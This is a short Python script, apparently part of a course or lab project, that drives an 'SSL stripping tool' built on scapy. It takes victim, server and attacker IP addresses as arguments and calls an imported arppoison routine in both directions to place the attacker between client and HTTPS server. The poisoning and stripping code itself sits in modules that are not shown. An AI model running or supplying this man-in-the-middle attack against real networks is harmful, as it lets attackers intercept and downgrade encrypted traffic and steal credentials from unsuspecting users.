import argparse
from scapy.all import *
import sys
from validate import validate
from arppoison import arppoison

#collect input from command line
parser = argparse.ArgumentParser(description = 'SSL stripping tool')
parser.add_argument('victimIP', help = 'IP of victim client', metavar = 'victimIP')
parser.add_argument('serverIP', help = 'IP of HTTPS server', metavar = 'serverIP')
parser.add_argument('attackerIP', help = 'IP of attacker', metavar = 'attackerIP')
parser.add_argument('-i', '--interface', help = 'Preferred interface for sending packets from attacker', dest = 'ifa', action = 'store', default = None)
args = parser.parse_args()

#validate input from command line
if not validate(args):
    sys.exit()

#poison server entry of ARP table of victim client
arppoison(args.victimIP, args.serverIP, args.attackerIP, args.ifa)

#poison client entry of ARP table of server
arppoison(args.serverIP, args.victimIP, args.attackerIP, args.ifa)
